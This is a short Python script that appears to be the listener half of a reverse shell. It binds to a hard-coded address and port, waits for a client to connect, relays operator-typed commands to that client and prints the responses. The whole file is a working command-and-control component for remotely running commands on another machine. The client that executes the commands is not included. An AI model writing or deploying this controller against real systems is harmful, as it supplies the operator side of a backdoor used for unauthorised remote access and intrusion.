import socket
import sys

# create socket (allows two computer to connect)

def socket_create():
	try:
		global host
		global port
		global s
		host = '192.168.1.77'
		port = 9999
		s = socket.socket()
	except socket.error as msg:
		print("socket create error: " +str(msg))


#bind socket to port and wait for connection from client 
def socket_bind():
	try:
		global host
		global port
		global s
		print("Binding socket to port : " +str(port))
		s.bind((host, port))
		s.listen(5)
	except socket.error as msg:
		print("socket Binding error: " + "\n" + "Retrying...")
		socket_bind()


# Establish a connection with client (socket must be listening for them)
def socket_accept():
	conn, address = s.accept()
	print("Connection Has Been Establish | " + " IP " + address[0] +" | Port " + str(address[1]))
	send_commands(conn)
	conn.close()


# Send commands
def send_commands(conn):
	while True:
		cmd = input()
		if cmd == 'quit':
			conn.close()
			s.close()
			sys.exit()
		if len(str.encode(cmd)) > 0:
			conn.send(str.encode(cmd))
			client_response = str(conn.recv(1024), "utf-8")
			print(client_response, end="")

def main():
	socket_create()
	socket_bind()
	socket_accept()


main()


		







